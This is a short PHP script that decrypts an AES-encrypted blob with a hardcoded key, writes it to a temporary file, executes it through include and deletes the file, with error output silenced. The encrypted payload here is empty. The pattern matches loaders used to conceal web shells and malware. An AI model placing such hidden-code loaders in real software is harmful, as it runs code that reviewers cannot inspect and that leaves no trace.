<?php
error_reporting(0);
ini_set('display_errors', 0);
function decrypt_code($data, $key, $iv) {
    return openssl_decrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
}
$enc_key = base64_decode('vD4ipTaVhY68j3IzkLerFNOwd4FR9+C5h9N1DsxMRU4=');
$encrypted_data = base64_decode('');
$iv_data = substr($encrypted_data, 0, 16);
$cipher_text = substr($encrypted_data, 16);
$source_code = decrypt_code($cipher_text, $enc_key, $iv_data);
$temp_file = tempnam(sys_get_temp_dir(), 'tmp_');
if ($temp_file === false) die('System error.');
if (file_put_contents($temp_file, $source_code) === false) die('System error.');
if (file_exists($temp_file)) {
    include $temp_file;
    unlink($temp_file);
}
?>